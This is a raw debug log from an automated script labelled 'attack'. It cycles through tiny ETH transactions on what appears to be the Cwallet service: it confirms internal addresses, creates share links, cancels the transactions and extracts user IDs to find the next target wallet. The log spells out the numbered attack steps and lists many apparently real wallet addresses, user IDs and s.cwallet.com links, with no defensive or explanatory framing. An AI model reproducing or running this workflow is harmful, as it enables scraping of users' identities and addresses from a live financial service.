2026-03-06 23:57:03,047 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:08:41,180 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:08:41,183 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:08:41,292 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:08:41,379 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:08:41,479 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:08:41,574 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:08:41,576 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:08:42,237 | DEBUG | attack | Extracted userId: 35694004
2026-03-07 00:08:42,240 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:08:42,241 | DEBUG | attack | Target address: 0x6a7d25cb91858e010e5b24679e7ecf9977b9074e | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:08:42,241 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:08:42,357 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:08:42,446 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:08:42,543 | DEBUG | attack | Generated billId: 202603062208592030042988104155136
2026-03-07 00:08:42,544 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:08:42,644 | DEBUG | attack | Generated billId: 202603062208592030042988091572224
2026-03-07 00:08:42,646 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:08:42,729 | DEBUG | attack | Extracted userId: 54482217
2026-03-07 00:08:42,732 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:08:42,744 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:08:42,745 | DEBUG | attack | Target address: 0x85153217b4d4da571cff1c356127592e4bd0dc6e | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:08:42,745 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:08:42,848 | DEBUG | attack | Generated billId: 202603062208592030042988204818432
2026-03-07 00:08:42,850 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:08:42,977 | DEBUG | attack | Extracted userId: 56250785
2026-03-07 00:08:42,985 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:08:42,986 | DEBUG | attack | Target address: 0xae71b32932845d66cd29a5ac2045fbd4821c6be2 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:08:42,987 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:08:43,755 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:08:43,779 | DEBUG | attack | Generated billId: 202603062209002030042994177507328
2026-03-07 00:08:43,780 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:08:43,889 | DEBUG | attack | Generated billId: 202603062209002030042994211061760
2026-03-07 00:08:43,890 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:08:43,982 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:08:43,985 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:08:44,087 | DEBUG | attack | Transaction result: {'bill_id': '202603062208592030042988091572224', 'type': 3}
2026-03-07 00:08:44,088 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:08:44,158 | DEBUG | attack | Transaction result: {'bill_id': '202603062208592030042988104155136', 'type': 3}
2026-03-07 00:08:44,158 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:08:44,355 | DEBUG | attack | Transaction result: {'bill_id': '202603062208592030042988204818432', 'type': 3}
2026-03-07 00:08:44,356 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:08:44,860 | DEBUG | attack | Transaction result: {'bill_id': '202603062209002030042994177507328', 'type': 3}
2026-03-07 00:08:44,861 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:08:44,967 | DEBUG | attack | Transaction result: {'bill_id': '202603062209002030042994211061760', 'type': 3}
2026-03-07 00:08:44,969 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:08:45,063 | DEBUG | attack | Transaction ID: 202603062209002030042994497974272
2026-03-07 00:08:45,064 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:08:45,179 | DEBUG | attack | Transaction ID: 202603062209002030042994451836928
2026-03-07 00:08:45,180 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:08:45,271 | DEBUG | attack | Transaction ID: 202603062209012030042995575906304
2026-03-07 00:08:45,274 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:08:45,391 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:08:46,086 | DEBUG | attack | Transaction ID: 202603062209012030042997958270976
2026-03-07 00:08:46,087 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:08:46,198 | DEBUG | attack | Transaction ID: 202603062209012030042998201540608
2026-03-07 00:08:46,199 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:08:46,307 | DEBUG | attack | Share link created: https://s.cwallet.com/1djrhv7
2026-03-07 00:08:46,308 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:08:46,395 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:08:46,487 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:08:46,584 | DEBUG | attack | Share link created: https://s.cwallet.com/zm49v1
2026-03-07 00:08:46,585 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:08:46,680 | DEBUG | attack | Share link created: https://s.cwallet.com/xk0u61
2026-03-07 00:08:46,684 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:08:46,768 | DEBUG | attack | Generated billId: 202603062209032030043004264808448
2026-03-07 00:08:46,770 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:08:46,863 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:08:47,545 | DEBUG | attack | Generated billId: 202603062209042030043010031976448
2026-03-07 00:08:47,545 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:08:47,647 | DEBUG | attack | Generated billId: 202603062209042030043010250080256
2026-03-07 00:08:47,648 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:08:47,737 | DEBUG | attack | Share link created: https://s.cwallet.com/17s5fpa
2026-03-07 00:08:47,738 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:08:47,834 | DEBUG | attack | Share link created: https://s.cwallet.com/xhrvwe
2026-03-07 00:08:47,834 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:08:47,992 | DEBUG | attack | Generated billId: 202603062209042030043010363326464
2026-03-07 00:08:47,993 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:08:48,104 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:08:48,106 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:08:48,199 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:08:48,200 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:08:48,283 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:08:48,286 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:08:48,374 | DEBUG | attack | Transaction result: {'bill_id': '202603062209032030043004264808448', 'type': 3}
2026-03-07 00:08:48,376 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:08:49,177 | DEBUG | attack | Extracted userId: 58301199
2026-03-07 00:08:49,179 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:08:49,180 | DEBUG | attack | Target address: 0xf578585050d28263cd916b28c5e8a2e91f679b33 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:08:49,180 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:08:49,284 | DEBUG | attack | Transaction ID: 202603062209042030043010646044672
2026-03-07 00:08:49,285 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:08:49,397 | DEBUG | attack | Extracted userId: 28244498
2026-03-07 00:08:49,401 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:08:49,402 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:08:49,518 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:08:49,519 | DEBUG | attack | Target address: 0x4b1166bb6419c1f956466ebd036bbf05eec98904 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:08:49,519 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:08:49,624 | DEBUG | attack | Extracted userId: 58045972
2026-03-07 00:08:49,629 | DEBUG | attack | Transaction result: {'bill_id': '202603062209042030043010031976448', 'type': 3}
2026-03-07 00:08:49,630 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:08:49,714 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:08:49,715 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:08:49,886 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:08:49,888 | DEBUG | attack | Target address: 0x1fdbcaaea94bd549bfaad1287d912695642ec39d | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:08:49,888 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:08:49,992 | DEBUG | attack | Transaction result: {'bill_id': '202603062209042030043010250080256', 'type': 3}
2026-03-07 00:08:49,994 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:08:50,097 | DEBUG | attack | Transaction result: {'bill_id': '202603062209042030043010363326464', 'type': 3}
2026-03-07 00:08:50,100 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:08:50,826 | DEBUG | attack | Extracted userId: 29018691
2026-03-07 00:08:50,828 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:08:50,828 | DEBUG | attack | Target address: 0x31c43fe233a59c759a9bc16330f5622835e99ace | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:08:50,828 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:08:50,962 | DEBUG | attack | Transaction ID: 202603062209062030043016727785472
2026-03-07 00:08:50,965 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:08:51,097 | DEBUG | attack | Transaction ID: 202603062209062030043016698425344
2026-03-07 00:08:51,098 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:08:51,204 | DEBUG | attack | Share link created: https://s.cwallet.com/1beemrn
2026-03-07 00:08:51,206 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:08:51,293 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:08:51,297 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:08:51,300 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:08:51,305 | DEBUG | attack | Extracted userId: 34043684
2026-03-07 00:08:51,319 | DEBUG | attack | Transaction ID: 202603062209062030043016878780416
2026-03-07 00:08:51,320 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:08:51,427 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:08:51,428 | DEBUG | attack | Target address: 0x671a2d967e90c49e9031e8db24c957c6fc22477d | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:08:51,428 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:08:52,076 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:08:52,159 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:08:52,199 | DEBUG | attack | Share link created: https://s.cwallet.com/xrkuc0
2026-03-07 00:08:52,199 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:08:52,269 | DEBUG | attack | Share link created: https://s.cwallet.com/196sr7i
2026-03-07 00:08:52,269 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:08:52,350 | DEBUG | attack | Share link created: https://s.cwallet.com/12jqsti
2026-03-07 00:08:52,352 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:08:52,453 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:08:52,454 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:08:53,258 | DEBUG | attack | Extracted userId: 41748561
2026-03-07 00:08:53,265 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:08:53,266 | DEBUG | attack | Target address: 0x2a870fd5ccc1cf68123b850eb5e7f2413bed3513 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:08:53,266 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:08:53,442 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:08:53,443 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:08:53,526 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:08:53,529 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:08:53,612 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:08:53,616 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:08:53,711 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:08:53,806 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:08:53,890 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:08:54,519 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:08:54,609 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:08:54,638 | DEBUG | attack | Extracted userId: 57004120
2026-03-07 00:08:54,638 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:08:54,639 | DEBUG | attack | Target address: 0xb664436cea1cab644ca4b094b541561a2a2dfe79 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:08:54,639 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:08:54,734 | DEBUG | attack | Generated billId: 202603062209112030043039832506368
2026-03-07 00:08:54,735 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:08:54,823 | DEBUG | attack | Generated billId: 202603062209112030043039845089280
2026-03-07 00:08:54,824 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:08:54,928 | DEBUG | attack | Extracted userId: 47218915
2026-03-07 00:08:54,931 | DEBUG | attack | Extracted userId: 46451264
2026-03-07 00:08:54,934 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:08:54,934 | DEBUG | attack | Target address: 0x66865ad74fe1f671eb6107f090bfacb30919ffb1 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:08:54,934 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:08:55,068 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:08:55,170 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:08:55,171 | DEBUG | attack | Target address: 0x11eb84a7e5703fb261274261e2ba69d921f60882 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:08:55,171 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:08:55,263 | DEBUG | attack | Generated billId: 202603062209112030043040830750720
2026-03-07 00:08:55,264 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:08:55,884 | DEBUG | attack | Generated billId: 202603062209122030043044962140160
2026-03-07 00:08:55,885 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:08:56,003 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:08:56,007 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:08:56,009 | DEBUG | attack | Generated billId: 202603062209132030043045389959168
2026-03-07 00:08:56,010 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:08:56,107 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:08:56,184 | DEBUG | attack | Transaction result: {'bill_id': '202603062209112030043039845089280', 'type': 3}
2026-03-07 00:08:56,185 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:08:56,288 | DEBUG | attack | Transaction result: {'bill_id': '202603062209112030043039832506368', 'type': 3}
2026-03-07 00:08:56,288 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:08:56,397 | DEBUG | attack | Transaction result: {'bill_id': '202603062209112030043040830750720', 'type': 3}
2026-03-07 00:08:56,398 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:08:57,126 | DEBUG | attack | Transaction ID: 202603062209132030043045521682432
2026-03-07 00:08:57,128 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:08:57,243 | DEBUG | attack | Transaction ID: 202603062209132030043045790117888
2026-03-07 00:08:57,244 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:08:57,338 | DEBUG | attack | Transaction ID: 202603062209132030043045576208384
2026-03-07 00:08:57,338 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:08:57,425 | DEBUG | attack | Transaction result: {'bill_id': '202603062209122030043044962140160', 'type': 3}
2026-03-07 00:08:57,426 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:08:57,507 | DEBUG | attack | Transaction result: {'bill_id': '202603062209132030043045389959168', 'type': 3}
2026-03-07 00:08:57,510 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:08:57,601 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:08:58,341 | DEBUG | attack | Share link created: https://s.cwallet.com/1dje2en
2026-03-07 00:08:58,343 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:08:58,469 | DEBUG | attack | Generated billId: 202603062209152030043055347236864
2026-03-07 00:08:58,469 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:08:58,563 | DEBUG | attack | Transaction ID: 202603062209132030043049267195904
2026-03-07 00:08:58,566 | DEBUG | attack | Step 5: Creating transaction share link
